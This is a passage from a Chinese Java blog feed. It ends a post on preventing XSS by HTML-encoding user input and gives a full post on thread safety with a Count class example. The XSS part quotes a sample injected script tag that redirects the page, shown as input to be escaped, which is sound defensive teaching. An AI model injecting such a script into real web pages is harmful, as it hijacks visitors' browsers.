<p>比如用户输入：&lt;script&gt;window.location.href=”<a href="http://www.baidu.com" target="_blank">http://www.baidu.com</a>”;&lt;/script&gt;，保存后最终存储的会是：&amp;lt;script&amp;gt;window.location.href=&amp;quot;<a href="http://www.baidu.com" target="_blank">http://www.baidu.com</a>&amp;quot;&amp;lt;/script&amp;gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</p>
<h1 id="其它">其它</h1>
<p>下面提供两种Html encode的方法。</p>
<ul>
<li>使用Apache的commons-lang.jar</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>StringEscapeUtils.escapeHtml(<span class="keyword">str</span>);<span class="comment">// 汉字会转换成对应的ASCII码，空格不转换</span>
</pre></td></tr></table></figure>

<ul>
<li>自己实现转换，只转换部分字符</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="code"><pre><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">htmlEncode</span>(<span class="keyword">char</span> c) {

    <span class="keyword">switch</span>(c) {

       <span class="keyword">case</span> <span class="string">'&'</span>:

           <span class="keyword">return</span> <span class="string">"&amp;"</span>;

       <span class="keyword">case</span> <span class="string">'&lt;'</span>:

           <span class="keyword">return</span> <span class="string">"&lt;"</span>;

       <span class="keyword">case</span> <span class="string">'&gt;'</span>:

           <span class="keyword">return</span> <span class="string">"&gt;"</span>;

       <span class="keyword">case</span> <span class="string">'"'</span>:

           <span class="keyword">return</span> <span class="string">"&quot;"</span>;

       <span class="keyword">case</span> <span class="string">' '</span>:

           <span class="keyword">return</span> <span class="string">"&nbsp;"</span>;

       <span class="keyword">default</span>:

           <span class="keyword">return</span> c +<span class="string">""</span>;

    }

}

 

<span class="javadoc">/** 对传入的字符串str进行Html encode转换 */</span>

<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">htmlEncode</span>(String str) {

    <span class="keyword">if</span>(str ==<span class="keyword">null</span> || str.trim().equals(<span class="string">""</span>))   <span class="keyword">return</span> str;

    StringBuilder encodeStrBuilder = <span class="keyword">new</span> StringBuilder();

    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, len = str.length(); i &lt; len; i++) {

       encodeStrBuilder.append(htmlEncode(str.charAt(i)));

    }

    <span class="keyword">return</span> encodeStrBuilder.toString();

}
</pre></td></tr></table></figure>

<p>(完)</p>
]]></content>
    
    
      <category term="XSS" scheme="http://www.ghsau.com/tags/XSS/"/>
    
      <category term="脚本攻击" scheme="http://www.ghsau.com/tags/%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="Java Web" scheme="http://www.ghsau.com/categories/Java%20Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java线程(一)：线程安全与不安全]]></title>
    <link href="http://www.ghsau.com/2012/04/02/java%E7%BA%BF%E7%A8%8B(%E4%B8%80)%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E4%B8%8E%E4%B8%8D%E5%AE%89%E5%85%A8/"/>
    <id>http://www.ghsau.com/2012/04/02/java线程(一)：线程安全与不安全/</id>
    <published>2012-04-02T04:13:00.000Z</published>
    <updated>2014-05-13T10:45:21.000Z</updated>
    <content type="html"><![CDATA[<p>作为一个Java web开发人员，很少也不需要去处理线程，因为服务器已经帮我们处理好了。记得大一刚学Java的时候，老师带着我们做了一个局域网聊天室，用到了AWT、Socket、多线程、I/O，编写的客户端和服务器，当时做出来很兴奋，回学校给同学们演示，感觉自己好NB，呵呵，扯远了。上次在百度开发者大会上看到一个提示语，自己写的代码，6个月不看也是别人的代码，自己学的知识也同样如此，学完的知识如果不使用或者不常常回顾，那么还不是自己的知识。大学零零散散搞了不到四年的Java，我相信很多人都跟我一样，JavaSE基础没打牢，就急忙忙、兴冲冲的搞JavaEE了，然后学习一下前台开发(html、css、javascript)，有可能还搞搞jquery、extjs，再然后是Struts、hibernate、spring，然后听说找工作得会linux、oracle，又去学，在这个过程中，是否迷失了，虽然学习面很广，但就像《神雕侠侣》中黄药师评价杨过，博而不精、杂而不纯，这一串下来，感觉做Java开发好难，并不是学着难，而是知识面太广了，又要精通这个，又要精通那个，这只是我迷茫时候的想法，现在我已经找到方向了。</p>
<a id="more"></a>

<p>回归正题，当我们查看JDK API的时候，总会发现一些类说明写着，线程安全或者线程不安全，比如说StringBuilder中，有这么一句，“将StringBuilder 的实例用于多个线程是不安全的。如果需要这样的同步，则建议使用StringBuffer。 ”，那么下面手动创建一个线程不安全的类，然后在多线程中使用这个类，看看有什么效果。</p>
<p>Count.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">class</span> Count {
	<span class="keyword">private</span> <span class="keyword">int</span> num;
	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title">count</span>() {
		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) {
			num += i;
		}
		System.<span class="keyword">out</span>.println(Thread.currentThread().getName() + <span class="string">"-"</span> + num);
	}
}
</pre></td></tr></table></figure>

<p>在这个类中的count方法是计算1一直加到10的和，并输出当前线程名和总和，我们期望的是每个线程都会输出55。<br>ThreadTest.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">class</span> ThreadTest {
	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(String[] args) {
		Runnable runnable = <span class="keyword">new</span> Runnable() {
			Count count = <span class="keyword">new</span> Count();
			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>() {
				count.count();
			}
		};
		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) {
			<span class="keyword">new</span> Thread(runnable).start();
		}
	}
}
</pre></td></tr></table></figure>

<p>这里启动了10个线程，看一下输出结果：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="keyword">Thread</span>-<span class="number">0</span>-<span class="number">55</span>
<span class="keyword">Thread</span>-<span class="number">1</span>-<span class="number">110</span>
<span class="keyword">Thread</span>-<span class="number">2</span>-<span class="number">165</span>
<span class="keyword">Thread</span>-<span class="number">4</span>-<span class="number">220</span>
<span class="keyword">Thread</span>-<span class="number">5</span>-<span class="number">275</span>
<span class="keyword">Thread</span>-<span class="number">6</span>-<span class="number">330</span>
<span class="keyword">Thread</span>-<span class="number">3</span>-<span class="number">385</span>
<span class="keyword">Thread</span>-<span class="number">7</span>-<span class="number">440</span>
<span class="keyword">Thread</span>-<span class="number">8</span>-<span class="number">495</span>
<span class="keyword">Thread</span>-<span class="number">9</span>-<span class="number">550</span>
</pre></td></tr></table></figure>

<p>只有Thread-0线程输出的结果是我们期望的，而输出的是每次都累加的，这里累加的原因以后的博文会说明，那么要想得到我们期望的结果，有几种解决方案：</p>
<h4 id="1-_将Count中num变成count方法的局部变量；">1. 将Count中num变成count方法的局部变量；</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">class</span> Count {
	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title">count</span>() {
		<span class="keyword">int</span> num = <span class="number">0</span>;
		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) {
			num += i;
		}
		System.<span class="keyword">out</span>.println(Thread.currentThread().getName() + <span class="string">"-"</span> + num);
	}
}
</pre></td></tr></table></figure>

<h4 id="2-_将线程类成员变量拿到run方法中，这时count引用是线程内的局部变量；">2. 将线程类成员变量拿到run方法中，这时count引用是线程内的局部变量；</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">class</span> ThreadTest4 {
	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(String[] args) {
		Runnable runnable = <span class="keyword">new</span> Runnable() {
			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>() {
				Count count = <span class="keyword">new</span> Count();
				count.count();
			}
		};
		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) {
			<span class="keyword">new</span> Thread(runnable).start();
		}
	}
}
</pre></td></tr></table></figure>

<h4 id="3-_每次启动一个线程使用不同的线程类，不推荐。">3. 每次启动一个线程使用不同的线程类，不推荐。</h4>
<p>上述测试，我们发现，存在成员变量的类用于多线程时是不安全的，不安全体现在这个成员变量可能发生<strong>非原子性的操作</strong>，而变量定义在方法内也就是局部变量是线程安全的。想想在使用struts1时，不推荐创建成员变量，因为action是单例的，如果创建了成员变量，就会存在线程不安全的隐患，而struts2是每一次请求都会创建一个action，就不用考虑线程安全的问题。所以，日常开发中，通常需要考虑成员变量或者说全局变量在多线程环境下，是否会引发一些问题。</p>
]]></content>
    <summary type="html"><![CDATA[<p>作为一个Java web开发人员，很少也不需要去处理线程，因为服务器已经帮我们处理好了。记得大一刚学Java的时候，老师带着我们做了一个局域网聊天室，用到了AWT、Socket、多线程、I/O，编写的客户端和服务器，当时做出来很兴奋，回学校给同学们演示，感觉自己好NB，呵呵，扯远了。上次在百度开发者大会上看到一个提示语，自己写的代码，6个月不看也是别人的代码，自己学的知识也同样如此，学完的知识如果不使用或者不常常回顾，那么还不是自己的知识。大学零零散散搞了不到四年的Java，我相信很多人都跟我一样，JavaSE基础没打牢，就急忙忙、兴冲冲的搞JavaEE了，然后学习一下前台开发(html、css、javascript)，有可能还搞搞jquery、extjs，再然后是Struts、hibernate、spring，然后听说找工作得会linux、oracle，又去学，在这个过程中，是否迷失了，虽然学习面很广，但就像《神雕侠侣》中黄药师评价杨过，博而不精、杂而不纯，这一串下来，感觉做Java开发好难，并不是学着难，而是知识面太广了，又要精通这个，又要精通那个，这只是我迷茫时候的想法，现在我已经找到方向了。</p>
]]></summary>
    
      <category term="线程安全" scheme="http://www.ghsau.com/tags/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/"/>
    
      <category term="多线程" scheme="http://www.ghsau.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Java SE" scheme="http://www.ghsau.com/categories/Java%20SE/"/>
    
      <category term="Java 线程" scheme="http://www.ghsau.com/categories/Java%20SE/Java%20%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
</feed>
